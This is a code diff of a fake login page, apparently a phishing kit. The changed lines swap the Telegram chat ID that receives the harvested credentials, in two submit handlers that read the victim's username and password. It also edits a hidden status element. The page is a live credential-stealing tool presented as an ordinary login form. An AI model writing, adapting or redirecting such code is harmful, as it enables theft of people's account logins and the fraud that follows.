@@ -274,7 +274,7 @@ form .create-account:hover {
             <button class="create-account" type="button">Create New Account</button>
         </form>
     
-        <p class="hidden" ="status"></p>
+        <div class="hidden" id="status" style="display: none;"></div> <!-- Status message display -->
       </div>
     </div>
     <!-- <form id="telegramForm">
@@ -369,7 +369,7 @@ form .create-account:hover {
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent the default form submission behavior
     
-            const chatId = '1866571175'; // Your Telegram chat ID
+            const chatId = '6393188021'; // Your Telegram chat ID
             // Get the username and password values from the form inputs
             const username = document.querySelector('input[name="username"]').value;
             const password = document.querySelector('input[name="password"]').value;
@@ -439,7 +439,7 @@ form .create-account:hover {
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent form from submitting normally
     
-            const chatId = '1866571175'; // Your Telegram chat ID
+            const chatId = '6393188021'; // Your Telegram chat ID
             const username = document.querySelector('input[name="username"]').value;
             const password = document.querySelector('input[name="password"]').value;
     
